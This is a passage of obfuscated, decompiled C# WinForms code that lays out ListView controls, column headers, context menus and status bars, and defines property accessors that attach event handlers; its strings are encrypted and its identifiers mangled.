			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Name = global::\u0006\u2001.\u0002(-1829124329);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().OwnerDraw = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().ShowItemToolTips = true;
			Control control33 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E();
			size = new Size(233, 238);
			control33.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().SmallImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().TabIndex = 10;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Tag = string.Empty;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().UseCompatibleStateImageBehavior = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().View = View.Details;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002().Text = global::\u0006\u2001.\u0002(-1829136393);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002().Text = global::\u0006\u2001.\u0002(-1829124350);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002().Text = global::\u0006\u2001.\u0002(-1829124246);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002().Width = 109;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Columns.AddRange(new ColumnHeader[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().ContextMenuStrip = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().FullRowSelect = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().GridLines = true;
			Control control34 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006();
			location = new Point(0, 0);
			control34.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Name = global::\u0006\u2001.\u0002(-1829124226);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().OwnerDraw = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().ShowItemToolTips = true;
			Control control35 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006();
			size = new Size(670, 335);
			control35.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().TabIndex = 9;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Tag = string.Empty;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().UseCompatibleStateImageBehavior = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().View = View.Details;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001().Text = global::\u0006\u2001.\u0002(-1829124237);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001().Text = global::\u0006\u2001.\u0002(-1829124283);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002().Text = global::\u0006\u2001.\u0002(-1829124350);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002().Text = global::\u0006\u2001.\u0002(-1829124270);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().Text = global::\u0006\u2001.\u0002(-1829124187);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002().Width = 426;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Columns.AddRange(new ColumnHeader[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ContextMenuStrip = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().FullRowSelect = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().GridLines = true;
			Control control36 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			location = new Point(0, 0);
			control36.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Name = global::\u0006\u2001.\u0002(-1829124171);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().OwnerDraw = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ShowItemToolTips = true;
			Control control37 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			size = new Size(670, 335);
			control37.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().TabIndex = 4;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Tag = string.Empty;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().UseCompatibleStateImageBehavior = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().View = View.Details;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Text = global::\u0006\u2001.\u0002(-1829124214);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Text = global::\u0006\u2001.\u0002(-1829124196);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().Text = global::\u0006\u2001.\u0002(-1829124116);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().Width = 116;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000().Text = global::\u0006\u2001.\u0002(-1829124099);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000().Text = global::\u0006\u2001.\u0002(-1829124148);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().Text = global::\u0006\u2001.\u0002(-1829124160);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().Width = 310;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Columns.AddRange(new ColumnHeader[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ContextMenuStrip = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().FullRowSelect = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().GridLines = true;
			Control control38 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control38.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829124142);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().OwnerDraw = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ShowItemToolTips = true;
			Control control39 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(670, 335);
			control39.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Tag = string.Empty;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().UseCompatibleStateImageBehavior = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().View = View.Details;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829136393);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text = global::\u0006\u2001.\u0002(-1829124568);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Width = 49;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Text = global::\u0006\u2001.\u0002(-1829139802);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Width = 116;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Text = global::\u0006\u2001.\u0002(-1829136422);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Text = global::\u0006\u2001.\u0002(-1829124546);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Width = 381;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(670, 335);
			this.ClientSize = size;
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005());
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003());
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006());
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003());
			this.Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.Name = global::\u0006\u2001.\u0002(-1829141549);
			this.Text = global::\u0006\u2001.\u0002(-1829141549);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().PerformLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().PerformLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().ResumeLayout(false);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().PerformLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().ResumeLayout(false);
			((ISupportInitialize)this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()).EndInit();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		// Token: 0x06000247 RID: 583 RVA: 0x0001F378 File Offset: 0x0001D578
		internal virtual \u000F\u2000 bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x06000248 RID: 584 RVA: 0x0001F38C File Offset: 0x0001D58C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(\u000F\u2000 \u0002)
		{
			this.\u0003 = \u0002;
		}

		// Token: 0x06000249 RID: 585 RVA: 0x0001F398 File Offset: 0x0001D598
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x0600024A RID: 586 RVA: 0x0001F3AC File Offset: 0x0001D5AC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(ColumnHeader \u0002)
		{
			this.\u0005 = \u0002;
		}

		// Token: 0x0600024B RID: 587 RVA: 0x0001F3B8 File Offset: 0x0001D5B8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0008;
		}

		// Token: 0x0600024C RID: 588 RVA: 0x0001F3CC File Offset: 0x0001D5CC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(ColumnHeader \u0002)
		{
			this.\u0008 = \u0002;
		}

		// Token: 0x0600024D RID: 589 RVA: 0x0001F3D8 File Offset: 0x0001D5D8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u0006;
		}

		// Token: 0x0600024E RID: 590 RVA: 0x0001F3EC File Offset: 0x0001D5EC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(ColumnHeader \u0002)
		{
			this.\u0006 = \u0002;
		}

		// Token: 0x0600024F RID: 591 RVA: 0x0001F3F8 File Offset: 0x0001D5F8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008()
		{
			return this.\u000E;
		}

		// Token: 0x06000250 RID: 592 RVA: 0x0001F40C File Offset: 0x0001D60C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(ColumnHeader \u0002)
		{
			this.\u000E = \u0002;
		}

		// Token: 0x06000251 RID: 593 RVA: 0x0001F418 File Offset: 0x0001D618
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006()
		{
			return this.\u000F;
		}

		// Token: 0x06000252 RID: 594 RVA: 0x0001F42C File Offset: 0x0001D62C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(ColumnHeader \u0002)
		{
			this.\u000F = \u0002;
		}

		// Token: 0x06000253 RID: 595 RVA: 0x0001F438 File Offset: 0x0001D638
		internal virtual StatusStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0002\u2000;
		}

		// Token: 0x06000254 RID: 596 RVA: 0x0001F44C File Offset: 0x0001D64C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(StatusStrip \u0002)
		{
			this.\u0002\u2000 = \u0002;
		}

		// Token: 0x06000255 RID: 597 RVA: 0x0001F458 File Offset: 0x0001D658
		internal virtual ToolStripStatusLabel bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003\u2000;
		}

		// Token: 0x06000256 RID: 598 RVA: 0x0001F46C File Offset: 0x0001D66C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(ToolStripStatusLabel \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006);
			if (this.\u0003\u2000 != null)
			{
				this.\u0003\u2000.Click -= value;
			}
			this.\u0003\u2000 = \u0002;
			if (this.\u0003\u2000 != null)
			{
				this.\u0003\u2000.Click += value;
			}
		}

		// Token: 0x06000257 RID: 599 RVA: 0x0001F4BC File Offset: 0x0001D6BC
		internal virtual ToolStripProgressBar bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005\u2000;
		}

		// Token: 0x06000258 RID: 600 RVA: 0x0001F4D0 File Offset: 0x0001D6D0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(ToolStripProgressBar \u0002)
		{
			this.\u0005\u2000 = \u0002;
		}

		// Token: 0x06000259 RID: 601 RVA: 0x0001F4DC File Offset: 0x0001D6DC
		internal virtual ContextMenuStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008\u2000;
		}

		// Token: 0x0600025A RID: 602 RVA: 0x0001F4F0 File Offset: 0x0001D6F0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(ContextMenuStrip \u0002)
		{
			this.\u0008\u2000 = \u0002;
		}

		// Token: 0x0600025B RID: 603 RVA: 0x0001F4FC File Offset: 0x0001D6FC
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006\u2000;
		}

		// Token: 0x0600025C RID: 604 RVA: 0x0001F510 File Offset: 0x0001D710
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003);
			if (this.\u0006\u2000 != null)
			{
				this.\u0006\u2000.Click -= value;
			}
			this.\u0006\u2000 = \u0002;
			if (this.\u0006\u2000 != null)
			{
				this.\u0006\u2000.Click += value;
			}
		}

		// Token: 0x0600025D RID: 605 RVA: 0x0001F560 File Offset: 0x0001D760
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000E\u2000;
		}

		// Token: 0x0600025E RID: 606 RVA: 0x0001F574 File Offset: 0x0001D774
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005);
			if (this.\u000E\u2000 != null)
			{
				this.\u000E\u2000.Click -= value;
			}
			this.\u000E\u2000 = \u0002;
			if (this.\u000E\u2000 != null)
			{
				this.\u000E\u2000.Click += value;
			}
		}

		// Token: 0x0600025F RID: 607 RVA: 0x0001F5C4 File Offset: 0x0001D7C4
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u000F\u2000;
		}

		// Token: 0x06000260 RID: 608 RVA: 0x0001F5D8 File Offset: 0x0001D7D8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008);
			if (this.\u000F\u2000 != null)
			{
				this.\u000F\u2000.Click -= value;
			}
			this.\u000F\u2000 = \u0002;
			if (this.\u000F\u2000 != null)
			{
				this.\u000F\u2000.Click += value;
			}
		}

		// Token: 0x06000261 RID: 609 RVA: 0x0001F628 File Offset: 0x0001D828
		internal virtual Timer bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0002\u2001;
		}

		// Token: 0x06000262 RID: 610 RVA: 0x0001F63C File Offset: 0x0001D83C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E);
			if (this.\u0002\u2001 != null)
			{
				this.\u0002\u2001.Tick -= value;
			}
			this.\u0002\u2001 = \u0002;
			if (this.\u0002\u2001 != null)
			{
				this.\u0002\u2001.Tick += value;
			}
		}

		// Token: 0x06000263 RID: 611 RVA: 0x0001F68C File Offset: 0x0001D88C
		internal virtual ListView bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003\u2001;
		}

		// Token: 0x06000264 RID: 612 RVA: 0x0001F6A0 File Offset: 0x0001D8A0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(ListView \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F);
			if (this.\u0003\u2001 != null)
			{
				this.\u0003\u2001.SelectedIndexChanged -= value;
			}
			this.\u0003\u2001 = \u0002;
			if (this.\u0003\u2001 != null)
			{
				this.\u0003\u2001.SelectedIndexChanged += value;
			}
		}

		// Token: 0x06000265 RID: 613 RVA: 0x0001F6F0 File Offset: 0x0001D8F0
		internal virtual \u000F\u2000 bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0005\u2001;
		}

		// Token: 0x06000266 RID: 614 RVA: 0x0001F704 File Offset: 0x0001D904
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(\u000F\u2000 \u0002)
		{
			this.\u0005\u2001 = \u0002;
		}

		// Token: 0x06000267 RID: 615 RVA: 0x0001F710 File Offset: 0x0001D910
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E()
		{
			return this.\u0008\u2001;
		}

		// Token: 0x06000268 RID: 616 RVA: 0x0001F724 File Offset: 0x0001D924
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(ColumnHeader \u0002)
		{
			this.\u0008\u2001 = \u0002;
		}

		// Token: 0x06000269 RID: 617 RVA: 0x0001F730 File Offset: 0x0001D930
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F()
		{
			return this.\u0006\u2001;
		}

		// Token: 0x0600026A RID: 618 RVA: 0x0001F744 File Offset: 0x0001D944
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(ColumnHeader \u0002)
		{
			this.\u0006\u2001 = \u0002;
		}

		// Token: 0x0600026B RID: 619 RVA: 0x0001F750 File Offset: 0x0001D950
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000()
		{
			return this.\u000E\u2001;
		}

		// Token: 0x0600026C RID: 620 RVA: 0x0001F764 File Offset: 0x0001D964
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000(ColumnHeader \u0002)
		{
			this.\u000E\u2001 = \u0002;
		}

		// Token: 0x0600026D RID: 621 RVA: 0x0001F770 File Offset: 0x0001D970
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000()
		{
			return this.\u000F\u2001;
		}

		// Token: 0x0600026E RID: 622 RVA: 0x0001F784 File Offset: 0x0001D984
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000(ColumnHeader \u0002)
